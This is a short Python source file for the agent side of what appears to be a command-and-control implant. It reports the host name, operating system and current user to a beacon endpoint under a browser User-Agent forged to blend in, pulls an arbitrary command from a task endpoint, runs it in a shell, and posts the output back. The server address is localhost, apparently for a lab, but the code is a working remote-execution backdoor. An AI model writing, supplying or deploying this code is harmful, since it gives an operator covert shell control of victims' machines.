import requests
import time
import subprocess
import platform
import getpass
import uuid
from datetime import datetime, timezone

URL = "http://127.0.0.1:5000"
BEACON = "/beacon"
TASK = "/task"
RESULT = "/result"

AGENT_ID = str(uuid.uuid4())

def get_timestamp():
    return datetime.now(timezone.utc).isoformat()

def beacon():
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"}
    payload = {"id": AGENT_ID, "hostname": platform.node(), "os": platform.system(), "current_user": getpass.getuser(), "timestamp": get_timestamp()}
    try:
        response = requests.post(URL + BEACON, json=payload, headers=headers)
        if response.status_code == 200:
            execute_task()
    except Exception as e:
        print(f"[!] Beacon Error: {e}")

def execute_task():
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"}
    task = requests.get(URL + TASK + f"/{AGENT_ID}", headers=headers).text
    if task:
        try:
            result = subprocess.check_output(task, shell=True, stderr=subprocess.STDOUT)
            post_results(result.decode('utf-8'))
        except subprocess.CalledProcessError as e:
            post_results(e.output.decode('utf-8'))

def post_results(result):
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"}
    payload = {"id": AGENT_ID, "output": result}
    try:
        requests.post(URL + RESULT, json=payload, headers=headers)
    except Exception as e:
        print(f"[!] Result posting error: {e}")

def main():
    beacon()
    time.sleep(10)
    
if __name__ == "__main__":
    main()